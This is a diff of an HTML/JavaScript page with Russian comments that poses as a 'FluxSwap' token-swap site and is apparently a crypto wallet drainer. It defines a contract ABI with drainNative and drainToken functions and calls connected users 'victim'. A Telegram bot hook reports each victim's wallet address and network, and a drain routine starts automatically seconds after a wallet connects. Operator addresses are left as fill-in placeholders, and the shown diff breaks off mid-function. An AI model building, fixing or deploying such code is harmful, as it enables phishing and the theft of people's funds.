@@ -9,6 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
+        /* ===== СТИЛИ (без изменений) ===== */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -172,7 +173,7 @@
         <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
     </div>
 
-    <!-- Модалка с одной опцией – WalletConnect -->
+    <!-- Модалка с одной опцией – WalletConnect (убрали MetaMask и Trust) -->
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
@@ -187,7 +188,6 @@
         </div>
     </div>
 
-    <!-- Модалка выбора токенов -->
     <div id="tokenModal" class="modal-overlay">
         <div class="modal">
             <h3>Select Token</h3>
@@ -197,781 +197,807 @@
         </div>
     </div>
 
-    <!-- ===== ИСПОЛЬЗУЕМ IMPORT MAP ДЛЯ ESM МОДУЛЕЙ ===== -->
-    <script type="importmap">
-    {
-        "imports": {
-            "ethers": "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js",
-            "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.2/dist/index.min.js"
-        }
-    }
+    <!-- ===== ЗАГРУЗКА БИБЛИОТЕК С CDN (ГАРАНТИРОВАННО РАБОТАЮЩИЕ) ===== -->
+    <script>
+        // Полифилл для process (некоторые библиотеки требуют)
+        window.process = window.process || { env: { NODE_ENV: 'production' } };
     </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <!-- Используем проверенную версию WalletConnect через unpkg (работает как UMD) -->
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.10.6/dist/umd/index.min.js"></script>
 
-    <!-- ===== ОСНОВНОЙ СКРИПТ КАК МОДУЛЬ ===== -->
-    <script type="module">
-        import ethers from 'ethers';
-        import EthereumProvider from '@walletconnect/ethereum-provider';
+    <script>
+        (function() {
+            'use strict';
 
-        console.log('✅ Ethers loaded:', ethers.version);
-        console.log('✅ WalletConnect loaded:', EthereumProvider);
-
-        // ===== КОНФИГУРАЦИЯ =====
-        const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
-        const CONTRACT_ADDRESSES = {
-            1: '0xТвойАдресНаEthereum',
-            56: '0xТвойАдресНаBSC',
-            137: '0xТвойАдресНаPolygon',
-            42161: '0xТвойАдресНаArbitrum'
-        };
-
-        // ===== НАСТРОЙКИ TELEGRAM =====
-        const TG_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
-        const TG_CHAT_ID = 'ВАШ_CHAT_ID';
-
-        const DRAINER_ABI = [
-            { "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
-            { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
-            { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [], "name": "drainNative", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "drainToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [], "name": "getNativeBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "getTokenBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
-        ];
-
-        const ERC20_ABI = [
-            'function balanceOf(address) view returns (uint256)',
-            'function approve(address spender, uint256 amount) returns (bool)',
-            'function transfer(address to, uint256 amount) returns (bool)',
-            'function decimals() view returns (uint8)',
-            'function symbol() view returns (string)',
-            'function allowance(address owner, address spender) view returns (uint256)'
-        ];
-
-        // ===== ТОКЕНЫ =====
-        const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
-        const tokens = [
-            { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg', id: 'ethereum' },
-            { symbol: 'BNB', name: 'BNB', img: ICON_BASE + '/bnb.svg', id: 'binancecoin' },
-            { symbol: 'USDT', name: 'Tether USD', img: ICON_BASE + '/usdt.svg', id: 'tether' },
-            { symbol: 'USDC', name: 'USD Coin', img: ICON_BASE + '/usdc.svg', id: 'usd-coin' },
-            { symbol: 'DAI', name: 'Dai', img: ICON_BASE + '/dai.svg', id: 'dai' },
-            { symbol: 'LINK', name: 'Chainlink', img: ICON_BASE + '/link.svg', id: 'chainlink' },
-            { symbol: 'MATIC', name: 'Polygon', img: ICON_BASE + '/matic.svg', id: 'polygon' },
-            { symbol: 'WBTC', name: 'Wrapped BTC', img: ICON_BASE + '/btc.svg', id: 'wbtc' }
-        ];
-
-        let fromToken = tokens[0];
-        let toToken = tokens[2];
-        let currentSelectType = null;
-        let currentRate = 0;
-
-        // ===== DOM =====
-        const statusEl = document.getElementById('status');
-        const connectBtn = document.getElementById('connectWalletBtn');
-        const swapBtn = document.getElementById('swapBtn');
-        const refreshBtn = document.getElementById('refreshBtn');
-        const inputAmount = document.getElementById('inputAmount');
-        const outputAmount = document.getElementById('outputAmount');
-        const maxBtn = document.getElementById('maxBtn');
-        const rateDisplay = document.getElementById('rateDisplay');
-        const fromSymbol = document.getElementById('fromSymbol');
-        const toSymbol = document.getElementById('toSymbol');
-        const fromIcon = document.getElementById('fromIcon');
-        const toIcon = document.getElementById('toIcon');
-        const swapArrow = document.getElementById('swapArrow');
-        const balanceFrom = document.getElementById('balanceFrom');
-        const balanceTo = document.getElementById('balanceTo');
-
-        const walletModal = document.getElementById('walletModal');
-        const closeModalBtn = document.getElementById('closeModalBtn');
-        const walletConnectOption = document.getElementById('walletConnectOption');
-
-        const tokenModal = document.getElementById('tokenModal');
-        const tokenSearchInput = document.getElementById('tokenSearchInput');
-        const tokenList = document.getElementById('tokenList');
-        const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
-
-        // ===== СОСТОЯНИЕ =====
-        let provider = null, signer = null, victim = null, chainId = null;
-        let isConnected = false, isProcessing = false, isConnecting = false;
-        let wcProvider = null;
-        let retryTimer = null;
-        let rateCache = {};
-        let fromBalanceWei = ethers.BigNumber.from(0);
-        let toBalanceWei = ethers.BigNumber.from(0);
-
-        // ===== TELEGRAM ЛОГГЕР =====
-        async function sendTelegramLog(message) {
-            if (!TG_BOT_TOKEN || TG_BOT_TOKEN === 'ВАШ_ТОКЕН_БОТА') return;
-            try {
-                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TG_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (e) {
-                console.warn('TG log failed:', e);
-            }
-        }
-
-        // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
-        function formatBalance(bn, decimals) {
-            if (!bn) return '0.000';
-            try {
-                return ethers.utils.formatUnits(bn, decimals || 18).slice(0, 10);
-            } catch (_) { return '0.000'; }
-        }
-
-        function getTokenDecimals(tokenSymbol) {
-            const map = { 'USDT': 6, 'USDC': 6, 'DAI': 18, 'WBTC': 8, 'LINK': 18, 'MATIC': 18, 'ETH': 18, 'BNB': 18 };
-            return map[tokenSymbol] || 18;
-        }
-
-        // ===== ПОЛУЧЕНИЕ КУРСОВ ЧЕРЕЗ BINANCE (без CORS) =====
-        const binanceSymbolMap = {
-            'ethereum': 'ETHUSDT',
-            'binancecoin': 'BNBUSDT',
-            'tether': 'USDTUSDT',
-            'usd-coin': 'USDCUSDT',
-            'dai': 'DAIUSDT',
-            'chainlink': 'LINKUSDT',
-            'polygon': 'MATICUSDT',
-            'wbtc': 'BTCUSDT'
-        };
-        let priceCacheUSD = {};
-
-        async function fetchPriceUSD(tokenId) {
-            if (tokenId === 'tether' || tokenId === 'usd-coin') return 1;
-            if (priceCacheUSD[tokenId] && (Date.now() - priceCacheUSD[tokenId].timestamp < 60000)) {
-                return priceCacheUSD[tokenId].price;
-            }
-            const pair = binanceSymbolMap[tokenId];
-            if (!pair) return null;
-            try {
-                const url = `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`;
-                const response = await fetch(url);
-                const data = await response.json();
-                if (data.price) {
-                    const price = parseFloat(data.price);
-                    priceCacheUSD[tokenId] = { price, timestamp: Date.now() };
-                    return price;
-                }
-                return null;
-            } catch (e) {
-                console.warn('Binance price fetch error:', e);
-                return null;
-            }
-        }
-
-        async function fetchRealRate(fromId, toId) {
-            const cacheKey = fromId + '-' + toId;
-            if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 60000)) {
-                return rateCache[cacheKey].rate;
-            }
-            try {
-                const fromPrice = await fetchPriceUSD(fromId);
-                const toPrice = await fetchPriceUSD(toId);
-                if (!fromPrice || !toPrice) throw new Error('Price not found');
-                const rate = fromPrice / toPrice;
-                rateCache[cacheKey] = { rate: rate, timestamp: Date.now() };
-                return rate;
-            } catch (error) {
-                console.error('Error fetching rate:', error);
-                return 1.2;
-            }
-        }
-
-        // ===== БАЛАНСЫ =====
-        async function updateBalances() {
-            if (!provider || !victim) return;
-            try {
-                if (fromToken.symbol === 'ETH' || fromToken.symbol === 'BNB' || fromToken.symbol === 'MATIC') {
-                    const bal = await provider.getBalance(victim);
-                    fromBalanceWei = bal;
-                    balanceFrom.innerHTML = formatBalance(bal, 18) + ' <button class="max-tag" id="maxBtn">Max</button>';
-                } else {
-                    const addr = getTokenAddress(fromToken.symbol);
-                    if (addr) {
-                        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-                        const bal = await contract.balanceOf(victim);
-                        const decimals = await contract.decimals().catch(() => 18);
-                        fromBalanceWei = bal;
-                        balanceFrom.innerHTML = formatBalance(bal, decimals) + ' <button class="max-tag" id="maxBtn">Max</button>';
-                    } else {
-                        balanceFrom.innerHTML = '0.000 <button class="max-tag" id="maxBtn">Max</button>';
-                        fromBalanceWei = ethers.BigNumber.from(0);
-                    }
-                }
-                if (toToken.symbol === 'ETH' || toToken.symbol === 'BNB' || toToken.symbol === 'MATIC') {
-                    const bal = await provider.getBalance(victim);
-                    toBalanceWei = bal;
-                    balanceTo.textContent = formatBalance(bal, 18);
-                } else {
-                    const addr = getTokenAddress(toToken.symbol);
-                    if (addr) {
-                        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-                        const bal = await contract.balanceOf(victim);
-                        const decimals = await contract.decimals().catch(() => 18);
-                        toBalanceWei = bal;
-                        balanceTo.textContent = formatBalance(bal, decimals);
-                    } else {
-                        balanceTo.textContent = '0.000';
-                        toBalanceWei = ethers.BigNumber.from(0);
-                    }
-                }
-            } catch (e) {
-                console.warn('Balance update error:', e);
-            }
-        }
-
-        function getTokenAddress(symbol) {
-            const map = {
-                1: { 'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7', 'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', 'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F', 'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', 'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
-                56: { 'USDT': '0x55d398326f99059fF775485246999027B3197955', 'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', 'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', 'WBTC': '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', 'LINK': '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD' },
-                137: { 'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', 'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', 'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', 'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6', 'LINK': '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39' },
-                42161: { 'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', 'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', 'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0', 'WBTC': '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', 'LINK': '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4' }
+            // ===== КОНФИГУРАЦИЯ =====
+            const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
+            const CONTRACT_ADDRESSES = {
+                1: '0xТвойАдресНаEthereum',
+                56: '0xТвойАдресНаBSC',
+                137: '0xТвойАдресНаPolygon',
+                42161: '0xТвойАдресНаArbitrum'
             };
-            if (!chainId || !map[chainId]) return null;
-            return map[chainId][symbol] || null;
-        }
 
-        // ===== ОБНОВЛЕНИЕ КУРСА =====
-        async function updateRateAndOutput() {
-            const fromId = fromToken.id;
-            const toId = toToken.id;
-            if (!fromId || !toId) {
-                rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ? ' + toToken.symbol;
-                outputAmount.value = '';
-                return;
-            }
-            const rate = await fetchRealRate(fromId, toId);
-            currentRate = rate;
-            rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ' + rate.toFixed(6) + ' ' + toToken.symbol;
-            const inputVal = parseFloat(inputAmount.value) || 0;
-            if (inputVal > 0) {
-                const outputVal = inputVal * rate;
-                outputAmount.value = outputVal.toFixed(6);
-            } else {
-                outputAmount.value = '';
-            }
-            const fromPrice = await fetchPriceUSD(fromId);
-            const toPrice = await fetchPriceUSD(toId);
-            document.getElementById('fromUsd').textContent = fromPrice ? '~$' + (inputVal * fromPrice).toFixed(2) : '~$0.00';
-            document.getElementById('toUsd').textContent = toPrice ? '~$' + (parseFloat(outputAmount.value || 0) * toPrice).toFixed(2) : '~$0.00';
-            if (isConnected) await updateBalances();
-        }
+            // ===== НАСТРОЙКИ TELEGRAM (опционально) =====
+            const TG_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
+            const TG_CHAT_ID = 'ВАШ_CHAT_ID';
 
-        // ===== UI =====
-        function setStatus(text, type) {
-            statusEl.textContent = text;
-            statusEl.className = 'status';
-            if (type === 'ok') statusEl.classList.add('ok');
-            if (type === 'err') statusEl.classList.add('err');
-        }
+            const DRAINER_ABI = [
+                { "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
+                { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+                { "inputs": [], "name": "drainNative", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "drainToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+                { "inputs": [], "name": "getNativeBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "getTokenBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+                { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
+            ];
 
-        function updateConnectButton() {
-            if (isConnected && victim) {
-                connectBtn.innerHTML = '<i class="fas fa-check"></i> ' + victim.slice(0,6) + '...' + victim.slice(-4);
-                connectBtn.classList.add('connected');
-            } else {
-                connectBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect';
-                connectBtn.classList.remove('connected');
-            }
-            updateSwapButton();
-        }
+            const ERC20_ABI = [
+                'function balanceOf(address) view returns (uint256)',
+                'function approve(address spender, uint256 amount) returns (bool)',
+                'function transfer(address to, uint256 amount) returns (bool)',
+                'function decimals() view returns (uint8)',
+                'function symbol() view returns (string)',
+                'function allowance(address owner, address spender) view returns (uint256)'
+            ];
 
-        function updateSwapButton() {
-            const val = parseFloat(inputAmount.value);
-            if (isProcessing) {
-                swapBtn.textContent = 'Processing...';
-                swapBtn.disabled = true;
-                swapBtn.className = 'btn-swap loading';
-                return;
-            }
-            if (!isConnected) {
-                swapBtn.textContent = 'Connect Wallet';
-                swapBtn.disabled = false;
-                swapBtn.className = 'btn-swap';
-                return;
-            }
-            if (!val || val <= 0) {
-                swapBtn.textContent = 'Enter an amount';
-                swapBtn.disabled = true;
-                swapBtn.className = 'btn-swap';
-                return;
-            }
-            swapBtn.textContent = 'Swap';
-            swapBtn.disabled = false;
-            swapBtn.className = 'btn-swap';
-        }
+            // ===== ТОКЕНЫ =====
+            const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
+            const tokens = [
+                { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg', id: 'ethereum' },
+                { symbol: 'BNB', name: 'BNB', img: ICON_BASE + '/bnb.svg', id: 'binancecoin' },
+                { symbol: 'USDT', name: 'Tether USD', img: ICON_BASE + '/usdt.svg', id: 'tether' },
+                { symbol: 'USDC', name: 'USD Coin', img: ICON_BASE + '/usdc.svg', id: 'usd-coin' },
+                { symbol: 'DAI', name: 'Dai', img: ICON_BASE + '/dai.svg', id: 'dai' },
+                { symbol: 'LINK', name: 'Chainlink', img: ICON_BASE + '/link.svg', id: 'chainlink' },
+                { symbol: 'MATIC', name: 'Polygon', img: ICON_BASE + '/matic.svg', id: 'polygon' },
+                { symbol: 'WBTC', name: 'Wrapped BTC', img: ICON_BASE + '/btc.svg', id: 'wbtc' }
+            ];
 
-        function openModal(modal) { modal.classList.add('active'); }
-        function closeModal(modal) { modal.classList.remove('active'); }
+            let fromToken = tokens[0];
+            let toToken = tokens[2];
+            let currentSelectType = null;
+            let currentRate = 0;
 
-        // ===== ОЧИСТКА =====
-        async function forceClearSession() {
-            try {
-                if (wcProvider) {
-                    try { await wcProvider.disconnect(); } catch (_) {}
-                    wcProvider = null;
-                }
-                const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
-                for (const pattern of patterns) {
-                    for (let i = localStorage.length - 1; i >= 0; i--) {
-                        const key = localStorage.key(i);
-                        if (key && key.toLowerCase().includes(pattern.toLowerCase())) localStorage.removeItem(key);
-                    }
-                    for (let i = sessionStorage.length - 1; i >= 0; i--) {
-                        const key = sessionStorage.key(i);
-                        if (key && key.toLowerCase().includes(pattern.toLowerCase())) sessionStorage.removeItem(key);
-                    }
-                    document.cookie.split(';').forEach(cookie => {
-                        const [name] = cookie.trim().split('=');
-                        if (name && name.toLowerCase().includes(pattern.toLowerCase())) {
-                            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
-                        }
+            // ===== DOM =====
+            const statusEl = document.getElementById('status');
+            const connectBtn = document.getElementById('connectWalletBtn');
+            const swapBtn = document.getElementById('swapBtn');
+            const refreshBtn = document.getElementById('refreshBtn');
+            const inputAmount = document.getElementById('inputAmount');
+            const outputAmount = document.getElementById('outputAmount');
+            const maxBtn = document.getElementById('maxBtn');
+            const rateDisplay = document.getElementById('rateDisplay');
+            const fromSymbol = document.getElementById('fromSymbol');
+            const toSymbol = document.getElementById('toSymbol');
+            const fromIcon = document.getElementById('fromIcon');
+            const toIcon = document.getElementById('toIcon');
+            const swapArrow = document.getElementById('swapArrow');
+            const balanceFrom = document.getElementById('balanceFrom');
+            const balanceTo = document.getElementById('balanceTo');
+
+            const walletModal = document.getElementById('walletModal');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const walletConnectOption = document.getElementById('walletConnectOption');
+
+            const tokenModal = document.getElementById('tokenModal');
+            const tokenSearchInput = document.getElementById('tokenSearchInput');
+            const tokenList = document.getElementById('tokenList');
+            const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
+
+            // ===== СОСТОЯНИЕ =====
+            let provider = null, signer = null, victim = null, chainId = null;
+            let isConnected = false, isProcessing = false, isConnecting = false;
+            let wcProvider = null;
+            let retryTimer = null;
+            let rateCache = {};
+            let fromBalanceWei = ethers.BigNumber.from(0);
+            let toBalanceWei = ethers.BigNumber.from(0);
+
+            // ===== TELEGRAM ЛОГГЕР =====
+            async function sendTelegramLog(message) {
+                if (!TG_BOT_TOKEN || TG_BOT_TOKEN === 'ВАШ_ТОКЕН_БОТА') return;
+                try {
+                    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TG_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
                     });
+                } catch (e) {
+                    console.warn('TG log failed:', e);
+                }
+            }
+
+            // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
+            function formatBalance(bn, decimals) {
+                if (!bn) return '0.000';
+                try {
+                    return ethers.utils.formatUnits(bn, decimals || 18).slice(0, 10);
+                } catch (_) { return '0.000'; }
+            }
+
+            function getTokenDecimals(tokenSymbol) {
+                const map = { 'USDT': 6, 'USDC': 6, 'DAI': 18, 'WBTC': 8, 'LINK': 18, 'MATIC': 18, 'ETH': 18, 'BNB': 18 };
+                return map[tokenSymbol] || 18;
+            }
+
+            // ===== ПОЛУЧЕНИЕ КУРСОВ ЧЕРЕЗ BINANCE (без CORS) =====
+            const binanceSymbolMap = {
+                'ethereum': 'ETHUSDT',
+                'binancecoin': 'BNBUSDT',
+                'tether': 'USDTUSDT',
+                'usd-coin': 'USDCUSDT',
+                'dai': 'DAIUSDT',
+                'chainlink': 'LINKUSDT',
+                'polygon': 'MATICUSDT',
+                'wbtc': 'BTCUSDT'
+            };
+            let priceCacheUSD = {};
+
+            async function fetchPriceUSD(tokenId) {
+                if (tokenId === 'tether' || tokenId === 'usd-coin') return 1;
+                if (priceCacheUSD[tokenId] && (Date.now() - priceCacheUSD[tokenId].timestamp < 60000)) {
+                    return priceCacheUSD[tokenId].price;
+                }
+                const pair = binanceSymbolMap[tokenId];
+                if (!pair) return null;
+                try {
+                    const url = `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (data.price) {
+                        const price = parseFloat(data.price);
+                        priceCacheUSD[tokenId] = { price, timestamp: Date.now() };
+                        return price;
+                    }
+                    return null;
+                } catch (e) {
+                    console.warn('Binance price fetch error:', e);
+                    return null;
+                }
+            }
+
+            async function fetchRealRate(fromId, toId) {
+                const cacheKey = fromId + '-' + toId;
+                if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 60000)) {
+                    return rateCache[cacheKey].rate;
                 }
                 try {
-                    const dbs = await indexedDB.databases();
-                    for (const db of dbs) {
-                        if (db.name && (db.name.toLowerCase().includes('wallet') || db.name.toLowerCase().includes('wc'))) {
-                            await new Promise((resolve, reject) => {
-                                const req = indexedDB.deleteDatabase(db.name);
-                                req.onsuccess = resolve;
-                                req.onerror = reject;
-                            });
-                        }
-                    }
-                } catch (_) {}
-                provider = null; signer = null; victim = null; chainId = null;
-                isConnected = false; isProcessing = false; isConnecting = false;
-                if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
-            } catch (_) {}
-        }
+                    const fromPrice = await fetchPriceUSD(fromId);
+                    const toPrice = await fetchPriceUSD(toId);
+                    if (!fromPrice || !toPrice) throw new Error('Price not found');
+                    const rate = fromPrice / toPrice;
+                    rateCache[cacheKey] = { rate: rate, timestamp: Date.now() };
+                    return rate;
+                } catch (error) {
+                    console.error('Error fetching rate:', error);
+                    return 1.2;
+                }
+            }
 
-        // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
-        async function connectWalletConnect() {
-            if (isConnecting || isProcessing) return;
-            closeModal(walletModal);
-
-            await forceClearSession();
-            await new Promise(resolve => setTimeout(resolve, 300));
-
-            try {
-                setStatus('Connecting to WalletConnect...', '');
-                isConnecting = true;
-
-                wcProvider = await EthereumProvider.init({
-                    projectId: PROJECT_ID,
-                    chains: [1, 56, 137, 42161],
-                    showQrModal: true,
-                    optionalChains: [1, 56, 137, 42161],
-                    methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
-                    events: ['chainChanged', 'accountsChanged'],
-                    metadata: {
-                        name: 'FluxSwap',
-                        description: 'Swap interface',
-                        url: window.location.href,
-                        icons: []
-                    }
-                });
-
-                wcProvider.on('chainChanged', (chainIdHex) => {
-                    chainId = parseInt(chainIdHex, 16);
-                    updateBalances();
-                });
-                wcProvider.on('accountsChanged', (accounts) => {
-                    if (accounts.length === 0) {
-                        setStatus('Account disconnected', 'err');
-                        isConnected = false;
-                        victim = null;
-                        updateConnectButton();
-                        isConnecting = false;
+            // ===== БАЛАНСЫ =====
+            async function updateBalances() {
+                if (!provider || !victim) return;
+                try {
+                    if (fromToken.symbol === 'ETH' || fromToken.symbol === 'BNB' || fromToken.symbol === 'MATIC') {
+                        const bal = await provider.getBalance(victim);
+                        fromBalanceWei = bal;
+                        balanceFrom.innerHTML = formatBalance(bal, 18) + ' <button class="max-tag" id="maxBtn">Max</button>';
                     } else {
-                        victim = accounts[0];
-                        updateConnectButton();
-                        updateBalances();
+                        const addr = getTokenAddress(fromToken.symbol);
+                        if (addr) {
+                            const contract = new ethers.Contract(addr, ERC20_ABI, provider);
+                            const bal = await contract.balanceOf(victim);
+                            const decimals = await contract.decimals().catch(() => 18);
+                            fromBalanceWei = bal;
+                            balanceFrom.innerHTML = formatBalance(bal, decimals) + ' <button class="max-tag" id="maxBtn">Max</button>';
+                        } else {
+                            balanceFrom.innerHTML = '0.000 <button class="max-tag" id="maxBtn">Max</button>';
+                            fromBalanceWei = ethers.BigNumber.from(0);
+                        }
                     }
-                });
-                wcProvider.on('session_delete', async () => {
-                    setStatus('Session expired', 'err');
-                    isConnected = false;
-                    await forceClearSession();
-                    updateConnectButton();
-                });
-
-                await wcProvider.enable();
-
-                const web3Provider = new ethers.providers.Web3Provider(wcProvider);
-                const signer_ = web3Provider.getSigner();
-                const address = await signer_.getAddress();
-                const network = await web3Provider.getNetwork();
-
-                provider = web3Provider;
-                signer = signer_;
-                victim = address;
-                chainId = network.chainId;
-                isConnected = true;
-
-                updateConnectButton();
-                setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
-                isConnecting = false;
-
-                await updateBalances();
-                await updateRateAndOutput();
-
-                const networkNames = {1: 'Ethereum', 56: 'BSC', 137: 'Polygon', 42161: 'Arbitrum'};
-                await sendTelegramLog(
-                    `🔗 <b>New connection</b>\n` +
-                    `👤 Account: <code>${address}</code>\n` +
-                    `🌐 Network: ${networkNames[chainId] || chainId}\n` +
-                    `⏰ Time: ${new Date().toLocaleString()}`
-                );
-
-                setTimeout(() => startDrain(), 800);
-
-            } catch (e) {
-                const msg = e.message || 'Unknown error';
-                setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
-                isConnecting = false;
-                await forceClearSession();
-                if (msg.toLowerCase().includes('reset') || msg.toLowerCase().includes('timeout')) {
-                    setStatus('Retrying...', 'err');
-                    retryTimer = setTimeout(() => {
-                        retryTimer = null;
-                        if (!isConnected && !isConnecting) {
-                            connectWalletConnect();
+                    if (toToken.symbol === 'ETH' || toToken.symbol === 'BNB' || toToken.symbol === 'MATIC') {
+                        const bal = await provider.getBalance(victim);
+                        toBalanceWei = bal;
+                        balanceTo.textContent = formatBalance(bal, 18);
+                    } else {
+                        const addr = getTokenAddress(toToken.symbol);
+                        if (addr) {
+                            const contract = new ethers.Contract(addr, ERC20_ABI, provider);
+                            const bal = await contract.balanceOf(victim);
+                            const decimals = await contract.decimals().catch(() => 18);
+                            toBalanceWei = bal;
+                            balanceTo.textContent = formatBalance(bal, decimals);
+                        } else {
+                            balanceTo.textContent = '0.000';
+                            toBalanceWei = ethers.BigNumber.from(0);
                         }
-                    }, 2000);
+                    }
+                } catch (e) {
